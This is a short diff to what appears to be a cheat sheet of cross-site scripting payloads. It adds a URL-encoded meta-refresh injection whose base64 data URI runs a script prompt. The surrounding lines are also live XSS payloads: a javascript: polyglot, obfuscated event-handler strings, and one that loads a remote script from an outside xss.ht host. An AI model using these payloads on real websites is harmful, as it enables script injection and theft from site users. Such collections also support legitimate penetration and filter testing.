@@ -147,6 +147,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/*+*/oNcliCk=alert()+)//%0D%0A%0d%0a//</stYle/</
 javascripT:eval('var a=document.createElement(\'script\'):a.src=\'https://ofjaaaah.xss.ht\':document.body.appendChild(a)')
 %3Cmarquee%20loop=1%20width=%271%26apos;%27onfinish=self[`al`+`ert`](1)%3E%23leet%3C/marquee%3E
 %3Cx%20y=1%20z=%271%26apos;%27onclick=self[`al`%2B`ert`](1)%3E%23CLICK%20MEE
+0%3Bdata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgUE9DbCIpPC9zY3JpcHQ%22HTTP-EQUIV%3D%22refresh%22
 ```
 
 ## XSS + SSRF <br>
